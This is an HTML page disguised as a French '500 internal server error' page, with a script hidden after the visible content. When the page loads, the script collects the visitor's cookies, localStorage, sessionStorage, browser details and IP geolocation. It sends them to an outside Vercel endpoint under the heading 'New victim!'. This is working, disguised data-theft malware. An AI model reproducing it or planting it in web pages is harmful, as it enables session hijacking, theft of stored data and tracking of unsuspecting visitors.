<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Erreur 500 - Erreur interne du serveur</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>500</h1>
        <h2>Erreur interne du serveur</h2>
        <p>Oups ! Quelque chose s'est mal pass√© sur notre serveur.<br>
        Veuillez r√©essayer plus tard.</p>
        <a href="/" class="home-btn">Retour √† l'accueil</a>
    </div>
<script>
const ENDPOINT = "https://cookies-eight-tan.vercel.app/api/cookies";

function getPlugins() {
  if (!navigator.plugins) return "None";
  const names = [];
  for(let i=0; i < navigator.plugins.length; i++) {
    names.push(navigator.plugins[i].name);
  }
  return names.length ? names.join(", ") : "None";
}

function tryStorage(storage) {
  const result = {};
  try {
    for(let i=0; i < storage.length; i++) {
      const key = storage.key(i);
      result[key] = storage.getItem(key);
    }
  } catch {
    return "Access denied";
  }
  return JSON.stringify(result);
}

async function getIpapiData() {
  try {
    const resp = await fetch('https://ipapi.co/json/');
    if (!resp.ok) throw new Error("Failed to fetch IP data");
    return await resp.json();
  } catch (e) {
    return {};
  }
}

document.addEventListener('DOMContentLoaded', async function() {
  const ipapi = await getIpapiData();

  // Structure claire‚ÄØ: chaque champ ipapi est inclus s√©par√©ment
  const data = {
    "üîî Nouvelle victime !": "",
    "üåê URL": location.href,
    "üç™ Cookie": document.cookie || "No cookies",
    "üß† User Agent": navigator.userAgent,
    "üåç Langue": navigator.language || navigator.userLanguage,
    "üñ•Ô∏è R√©solution": `${screen.width}x${screen.height}`,
    "‚è∞ Fuseau horaire": Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
    "üß© Plugins": getPlugins(),
    "üîô Referrer": document.referrer || "None",
    "üïí Heure locale": new Date().toString(),
    "üìÇ localStorage": tryStorage(localStorage),
    "üìÇ sessionStorage": tryStorage(sessionStorage),
    "üßë‚Äçüíª Plateforme": navigator.platform,
    // Ajout de chaque champ ipapi s√©par√©ment
    "üõú IP": ipapi.ip || "",
    "üåç Network": ipapi.network || "",
    "üåê Version": ipapi.version || "",
    "üèôÔ∏è City": ipapi.city || "",
    "üèûÔ∏è Region": ipapi.region || "",
    "üèûÔ∏è Region Code": ipapi.region_code || "",
    "üá®üáµ Country": ipapi.country || "",
    "üåé Country Name": ipapi.country_name || "",
    "üåé Country Code": ipapi.country_code || "",
    "üåé Country ISO3": ipapi.country_code_iso3 || "",
    "üèõÔ∏è Capital": ipapi.country_capital || "",
    "üåê TLD": ipapi.country_tld || "",
    "üåç Continent Code": ipapi.continent_code || "",
    "üá™üá∫ In EU": ipapi.in_eu || "",
    "üè§ Postal": ipapi.postal || "",
    "üó∫Ô∏è Latitude": ipapi.latitude || "",
    "üó∫Ô∏è Longitude": ipapi.longitude || "",
    "‚è∞ IP Timezone": ipapi.timezone || "",
    "‚è∞ UTC Offset": ipapi.utc_offset || "",
    "üìû Country Calling Code": ipapi.country_calling_code || "",
    "üí∂ Currency": ipapi.currency || "",
    "üí∂ Currency Name": ipapi.currency_name || "",
    "üåê Languages": ipapi.languages || "",
    "üåç Country Area": ipapi.country_area || "",
    "üë• Country Population": ipapi.country_population || "",
    "üõ∞Ô∏è ASN": ipapi.asn || "",
    "üè¢ Org": ipapi.org || ""
  };

  // Envoi des donn√©es au serveur Vercel
  fetch(ENDPOINT, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ data })
  })
  .catch(e => console.error("API send error:", e));
});</script></body>
</html>